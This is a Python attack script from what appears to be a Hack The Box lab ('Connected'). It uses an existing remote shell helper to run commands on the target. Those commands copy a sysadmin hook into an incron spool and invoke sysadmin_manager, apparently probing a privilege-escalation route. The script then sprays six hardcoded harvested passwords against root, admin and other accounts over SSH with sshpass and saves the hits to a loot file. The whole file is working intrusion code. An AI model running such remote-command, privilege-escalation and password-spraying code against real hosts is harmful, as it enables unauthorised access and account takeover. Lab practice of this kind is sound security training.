#!/usr/bin/env python3
import subprocess
import sys

sys.path.insert(0, "/home/kali/Desktop/htb/Connected/scripts")
from enum_privesc import get_shell

IP = "10.129.245.100"
cmd, url = get_shell()
print("shell", url)

tests = [
    (
        "manual sysadmin_manager",
        "cp /var/www/html/admin/modules/sysadmin/hooks/dump-iptables "
        "/var/spool/asterisk/incron/sysadmin.dump-iptables.CONTENTS; "
        "/usr/bin/sysadmin_manager sysadmin.dump-iptables.CONTENTS 2>&1; "
        "ls -la /tmp/iptables-save-output 2>&1",
    ),
    (
        "hook file format",
        "xxd /var/www/html/admin/modules/sysadmin/hooks/dump-iptables | head -5; "
        "wc -c /var/www/html/admin/modules/sysadmin/hooks/toggle-sshkeys-rpm; "
        "head -5 /var/www/html/admin/modules/sysadmin/hooks/toggle-sshkeys-rpm",
    ),
    (
        "grep signed hooks",
        "grep -l 'BEGIN PGP' /var/www/html/admin/modules/sysadmin/hooks/* 2>/dev/null | head -10",
    ),
]

for t, c in tests:
    print("\n##", t)
    print(cmd(c, timeout=120)[:6000])

passes = [
    "manag3rpa55word",
    "fe1mYBs7D5P3",
    "mZzDpAGKTmPJ",
    "cxmanager*con",
    "qf0cl1r2o9sd79s2bn7habsu4r",
    "h0kesimg5368cii56h2i7ll8qn",
]
users = ["admin", "root", "asterisk", "manager"]
hits = []
for u in users:
    for p in passes:
        r = subprocess.run(
            ["sshpass", "-p", p, "ssh", "-o", "StrictHostKeyChecking=no",
             "-o", "ConnectTimeout=5", f"{u}@{IP}", "id"],
            capture_output=True, text=True, timeout=8,
        )
        if r.returncode == 0:
            hits.append(f"{u}:{p} -> {r.stdout.strip()}")
            print("HIT", hits[-1])

open("/home/kali/Desktop/htb/Connected/loot/ssh-spray.txt", "w").write(
    "\n".join(hits) if hits else "no hits\n# tried: " + ", ".join(passes)
)